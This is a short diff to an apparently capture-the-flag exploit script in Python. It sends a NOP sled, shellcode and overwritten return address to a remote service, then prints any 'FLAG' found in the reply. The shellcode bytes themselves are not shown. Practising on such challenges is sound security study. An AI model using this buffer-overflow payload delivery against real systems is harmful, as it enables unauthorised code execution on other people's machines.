@@ -26,7 +26,10 @@ def longshotr(IPaddr, port):
     #r.send(payload + '\n')
     data2 = r.recvuntil("analyzed:")
     #print data2
-    r.send(nopsled + shellcode + ret_addr + '\n')
-    data3 = r.recvall()
-    print data3
+    r.sendline(nopsled + shellcode + ret_addr + '\n')
+    output = r.recvall()
+    if "FLAG" in output:
+        pos = output.find("FLAG")
+        print output[pos:]
+
 longshotr(argv[1],argv[2])
